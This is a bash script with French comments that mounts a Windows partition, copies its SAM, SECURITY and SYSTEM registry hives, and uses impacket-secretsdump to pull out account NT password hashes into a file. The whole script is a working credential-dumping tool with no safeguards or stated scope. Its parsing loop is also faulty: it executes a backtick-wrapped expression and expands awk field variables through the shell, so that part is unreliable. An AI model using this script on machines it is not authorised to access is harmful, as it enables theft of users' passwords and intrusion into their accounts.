#!/bin/bash

configPath="Windows/System32/config"
if [ -z "$1" ]; then
  part="sda3"
else
  part=$1
fi
echo "Dumping hashnt from '$part' ..."
sudo mkdir /mnt/$part
sudo mount -o ro /dev/$part /mnt/$part
mkdir win
sudo cp /mnt/$part/$configPath/SAM ./win/SAM
sudo cp /mnt/$part/$configPath/SECURITY ./win/SECURITY
sudo cp /mnt/$part/$configPath/SYSTEM ./win/SYSTEM
sudo umount /dev/$part
sudo rmdir /mnt/$part
# sudo apt-get install impacket-secretsdump -y > /dev/null
hashs="$(sudo impacket-secretsdump -sam ./win/SAM -system ./win/SYSTEM -security ./win/SECURITY LOCAL | grep :::)"
hashs="${hashs// ::: /$'\n'}"

# Remplacer ':' par un espace
hashs="${hashs//:/ }"

# Utiliser la commande "read" pour parcourir les lignes de la variable
while IFS= read -r line; do
  line=`$(echo "$line" | awk "{print $1}") = $(echo "$line" | awk "{print $NF}")`
  echo "$line"
  echo "$line" >> ./win/hashnt
done <<< "$hashs"

cat ./win/hashnt
